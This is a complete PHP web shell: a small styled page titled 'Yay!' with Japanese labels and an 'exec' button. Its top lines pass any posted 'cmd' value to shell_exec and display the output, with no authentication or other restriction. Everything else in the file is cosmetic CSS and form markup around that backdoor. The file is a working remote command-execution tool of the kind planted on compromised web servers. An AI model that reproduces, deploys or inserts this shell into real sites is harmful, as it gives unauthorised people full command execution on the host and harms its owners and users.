<?php
if (!empty($_POST["cmd"])) {
  $cmd = shell_exec($_POST["cmd"]);
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400&display=swap"
    />
    <title>Yay!</title>
    <style>
      :root {
        --bg--clr: #fed9b7;
        --focus--clr: #e76f51;
        --main--clr: #faca9d;
        --text--clr: #2b2e44;
        --input--clr: #f4f1de;
        --selection--clr: #f4f1de;
        --selection-focus--clr: #161722;
        --scrollbar-clr: #2b1d1d;
      }

      * {
        -webkit-box-sizing: border-box;
        box-sizing: border-box;
        color: var(--text--clr);
        font-weight: 100;
        scrollbar-color: var(--scrollbar-clr) transparent;
      }

      *::-webkit-scrollbar-thumb {
        background: var(--scrollbar-clr);
      }

      *::-webkit-scrollbar-corner {
        display: none;
      }

      *::-webkit-scrollbar {
        width: 6px;
        height: 6px;
      }

      .shell {
        font-family: "Noto Sans JP", sans-serif;
        background-color: var(--bg--clr);
      }

      .main {
        margin: auto;
        background-color: var(--bg--clr);
        width: 100%;
        height: 100%;
        display: flex;
        place-items: center;
        flex-direction: column;
      }

      .ipt {
        all: unset;
        width: 100%;
        height: 20%;
        border: none;
        outline: none;
        font-size: 15px;
        font-weight: 400;
      }

      .btn {
        all: unset;
        border: none;
        cursor: pointer;
        margin-left: 5px;
        outline: none;
      }

      .result,
      .ipt,
      .btn,
      .no-result {
        background-color: var(--main--clr);
        transition: 100ms;
        padding: 10px;
      }

      .result {
        width: 80%;
        overflow: scroll;
      }

      .no-result {
        width: 20%;
        text-align: center;
        font-weight: 400;
      }

      .form {
        height: 100%;
        width: 80%;
      }

      .form-group {
        display: flex;
        padding: 15px 0;
      }

      .ipt::placeholder {
        color: var(--text--clr);
        opacity: 0.6;
        font-weight: 300;
      }

      /* Events */

      *::selection {
        background: var(--selection--clr);
      }

      .ipt:focus::selection,
      .btn:focus::selection,
      .ipt:hover::selection {
        background: var(--selection-focus--clr);
      }

      .btn:hover,
      .ipt:hover,
      .btn:focus,
      .ipt:focus {
        background-color: var(--focus--clr);
        color: var(--input--clr);
      }

      .ipt:focus::placeholder,
      .ipt:hover::placeholder {
        color: var(--input--clr);
        opacity: 0.8;
      }
    </style>
  </head>

  <body class="shell">
    <main class="main">
      <form method="post" class="form">
        <div class="form-group">
          <input
            class="ipt"
            type="text"
            name="cmd"
            id="cmd"
            value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
            onfocus="this.setSelectionRange(this.value.length, this.value.length);"
            autofocus
            required
            placeholder="指図"
          />
          <button type="submit" class="btn">exec</button>
        </div>
      </form>

      <?php if ($_SERVER["REQUEST_METHOD"] === "POST"): ?>
      <?php if (isset($cmd)): ?>
      <pre
        class="result"
      ><?= htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") ?></pre>
      <?php else: ?>
      <span class="no-result">なし。</span>
      <?php endif; ?>
      <?php endif; ?>
    </main>
  </body>
</html>
